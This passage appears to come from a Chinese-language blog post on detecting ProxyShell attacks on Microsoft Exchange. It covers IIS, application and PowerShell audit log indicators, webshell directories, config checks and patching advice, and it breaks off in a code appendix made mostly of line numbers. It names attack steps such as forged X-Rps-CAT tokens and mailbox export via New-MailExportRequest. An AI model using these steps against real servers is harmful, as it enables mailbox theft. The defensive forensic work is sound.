src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<ul>
<li>检查 IIS 日志中是否存在 <code>/autodiscover/autodiscover.json</code> 和  <code>/mapi/nspi/</code> 字符串的 URI，可以判断是否存在探测 Proxyshell 漏洞的行为。</li>
</ul>
<p><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630336749505-d53bc17f-df3e-49fc-a817-aae6b6fea242.png#clientId=uf4e35cdb-e404-4&from=paste&height=898&id=u51f0e7e4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=898&originWidth=2816&originalType=binary&ratio=1&size=542130&status=done&style=none&taskId=u53e89b67-a869-4cd4-8f91-fbcd72e5bde&width=2816" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<ul>
<li>检查 IIS 日志中是否存在 <code>/autodiscover/autodiscover.json</code> 和 <code>/autodiscover/autodiscover.xml</code> 字符串的 URI，可以判断攻击者是否尝试获取 LegacyDN。</li>
</ul>
<p><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630337990731-493ffea3-721b-4759-ab1c-3de107fd40e1.png#clientId=uf4e35cdb-e404-4&from=paste&id=u0df16df5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=666&originWidth=2560&originalType=binary&ratio=1&size=327263&status=done&style=none&taskId=uf6f6c12f-5a8e-4cca-b3ab-ab69267642f" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<ul>
<li>检查 IIS 日志中是否存在 <code>/autodiscover/autodiscover.json</code> 和 <code>/mapi/emsmdb </code> 字符串的 URI，可以判断攻击者是否利用 LegacyDN 获取 SID。</li>
</ul>
<p><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630489902573-dfeee8ea-7a5e-423e-9dd7-702bd1ceb122.png#clientId=u572e2de2-18e4-4&from=paste&height=389&id=u21f87956&margin=%5Bobject%20Object%5D&name=image.png&originHeight=389&originWidth=1423&originalType=binary&ratio=1&size=293061&status=done&style=none&taskId=u12311102-aad1-481a-9145-f1139a92e7e&width=1423" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<ul>
<li>检查 IIS 日志中是否存在 <code>/autodiscover/autodiscover.json</code> 和 <code>X-Rps-CAT</code> 字符串的 URI，X-Rps-CAT 参数值为 Base64 字符串，解码后为 Windows 身份认证令牌。可以判断攻击者是否获取 SID 伪造了身份令牌，如果响应 200，说明攻击者成功获取了 <code>/powershell</code> 接口的权限。</li>
</ul>
<p><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630489859517-b674422e-9d8b-48d8-9dd4-a95af3cd16fc.png#clientId=u572e2de2-18e4-4&from=paste&height=539&id=u74a50c34&margin=%5Bobject%20Object%5D&name=image.png&originHeight=539&originWidth=1428&originalType=binary&ratio=1&size=392587&status=done&style=none&taskId=udc51aa8c-6b29-4f2c-8c03-7e217775b12&width=1428" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span><br><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630489968017-c18ecc86-8fba-41c4-bb03-652c07be2ae4.png#clientId=u572e2de2-18e4-4&from=paste&height=452&id=ub409665f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=452&originWidth=1424&originalType=binary&ratio=1&size=158585&status=done&style=none&taskId=uf364df5e-be4e-4b8b-a292-f5170fa32ac&width=1424" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<h3 id="（2）应用程序日志分析"><a href="#（2）应用程序日志分析" class="headerlink" title="（2）应用程序日志分析"></a>（2）应用程序日志分析</h3><ul>
<li>排查系统应用程序日志，是否存在以下事件序列：<ul>
<li>Front End HTTP Proxy —&gt; Autodiscover —&gt; MapiMailboxAppPool</li>
</ul>
</li>
</ul>
<p><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630377883720-e3208050-70b7-4d26-9f51-e4369407ddf6.png#clientId=u76956966-30c8-4&from=paste&height=432&id=u4ac99247&margin=%5Bobject%20Object%5D&name=image.png&originHeight=432&originWidth=1005&originalType=binary&ratio=1&size=350653&status=done&style=none&taskId=u42238cda-f4ff-4fc4-8975-aadc4439c4b&width=1005" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<ul>
<li>如果攻击者构造的令牌无效，会触发“MSExchange RemotePowershell BackendCmdletProxy Module”错误事件日志：</li>
</ul>
<p><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630482250369-b47680c8-e0ef-43de-9b5b-13e44124250c.png#clientId=u572e2de2-18e4-4&from=paste&height=916&id=ub1d32cca&margin=%5Bobject%20Object%5D&name=image.png&originHeight=916&originWidth=1461&originalType=binary&ratio=1&size=349621&status=done&style=none&taskId=u473de4d6-b099-4f0c-bb1e-781d3efd000&width=1461" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<h3 id="（3）Exchnage-审计日志分析"><a href="#（3）Exchnage-审计日志分析" class="headerlink" title="（3）Exchnage 审计日志分析"></a>（3）Exchnage 审计日志分析</h3><p>Exchange 审计日志默认位于 Exchange 安装目录下:</p>
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Program Files\Microsoft\Exchange Server\V15\Logging<br><br>或<br>    <br><span class="hljs-name">C</span>:\Users\Administrator\AppData\Local\Microsoft\Exchange Server\v15\Logging<br></code></pre></td></tr></table></figure>
<p><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630378216698-56ac450c-d548-49fb-a2fe-c99320bbe13f.png#clientId=u76956966-30c8-4&from=paste&height=851&id=ude7cceef&margin=%5Bobject%20Object%5D&name=image.png&originHeight=851&originWidth=1228&originalType=binary&ratio=1&size=192504&status=done&style=none&taskId=u084ba61f-7198-4da3-82e7-0dba2cbb010&width=1228" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<ul>
<li><p>查看 Exchange Powershell 日志</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">C:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Microsoft\Exchange</span> Server<span class="hljs-string">\V15\Logging\CmdletInfra</span><br></code></pre></td></tr></table></figure>
<p><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630378684576-ef7c1ba0-0aca-4ba5-aa7d-44dfbcc5d3c9.png#clientId=u76956966-30c8-4&from=paste&height=263&id=uaf29287e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=263&originWidth=1020&originalType=binary&ratio=1&size=46611&status=done&style=none&taskId=u2245da1b-77a2-42ea-b06a-cc36306fbc6&width=1020" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
</li>
<li><p>检查 powershell 日志中是否存在 <code>New-ManagementRoleAssignment</code> 命令记录，说明攻击者执行了添加邮件导出权限。</p>
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\Cmdlet<br></code></pre></td></tr></table></figure>
<p><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630490152995-39533557-19fe-43cf-9700-08ea15181aa3.png#clientId=u572e2de2-18e4-4&from=paste&height=493&id=u35e88ee0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=493&originWidth=1433&originalType=binary&ratio=1&size=246156&status=done&style=none&taskId=u17fbf549-839f-44ee-8f20-2435a2a8704&width=1433" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
</li>
<li><p>检查 powershell 日志中是否存在 <code>New-MailExportRequest</code>  命令记录，说明攻击者执行导出邮件操作。</p>
</li>
</ul>
<h3 id="（4）webshell-排查"><a href="#（4）webshell-排查" class="headerlink" title="（4）webshell 排查"></a>（4）webshell 排查</h3><p>排查相关目录下是否存在可疑的 webshell 文件：</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment"># ASP.NET 目录</span><br>C:<span class="hljs-string">\inetpub\wwwroot\aspnet_client\</span><br>    <br><span class="hljs-comment"># Exchange 前端目录</span><br>C:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Microsoft\Exchange</span> Server<span class="hljs-string">\V15\FrontEnd\HttpProxy\owa\auth</span><br></code></pre></td></tr></table></figure>

<h3 id="（5）配置文件排查"><a href="#（5）配置文件排查" class="headerlink" title="（5）配置文件排查"></a>（5）配置文件排查</h3><p>排查IIS存储配置区文件的sites节点中是否存在可疑的 <code>virtualDirectory</code> 配置项。</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">C:\Windows\System32\inetsrv\config\applicationHost.config<br></code></pre></td></tr></table></figure>
<p><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630379119071-b9b0db48-a35b-4f90-b88c-fd4f3e10271b.png#clientId=u76956966-30c8-4&from=paste&height=499&id=u41e16c12&margin=%5Bobject%20Object%5D&name=image.png&originHeight=367&originWidth=549&originalType=binary&ratio=1&size=139770&status=done&style=none&taskId=ufc9de97d-dc7f-4728-878c-168274a9c6e&width=747" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<h2 id="4、漏洞修复"><a href="#4、漏洞修复" class="headerlink" title="4、漏洞修复"></a>4、漏洞修复</h2><p>微软已发布上述 ProxyShell 3个高危漏洞的安全补丁，升级修复即可。</p>
<p><strong>漏洞检测</strong><br>用户可使用微软官方提供的 Exchange Server 运行状况检查脚本，判断查当前Exchange是否在漏洞影响范围。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//mi</span>crosoft.github.io<span class="hljs-regexp">/CSS-Exchange/</span>Diagnostics<span class="hljs-regexp">/HealthChecker/</span><br></code></pre></td></tr></table></figure>


<h2 id="5、参考链接"><a href="#5、参考链接" class="headerlink" title="5、参考链接"></a>5、参考链接</h2><p><a target="_blank" rel="noopener" href="https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/">https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/-qJh2u0mbrKWxWNCZgOrVw">https://mp.weixin.qq.com/s/-qJh2u0mbrKWxWNCZgOrVw</a><br><a target="_blank" rel="noopener" href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf">https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/EznnWZLuYQHmLsmTVpQAug">https://mp.weixin.qq.com/s/EznnWZLuYQHmLsmTVpQAug</a></p>
<h1 id="附录-Exchange-Powershell-命令"><a href="#附录-Exchange-Powershell-命令" class="headerlink" title="附录. Exchange Powershell 命令"></a>附录. Exchange Powershell 命令</h1><h2 id="1、cmdlet-权限"><a href="#1、cmdlet-权限" class="headerlink" title="1、cmdlet 权限"></a>1、cmdlet 权限</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span 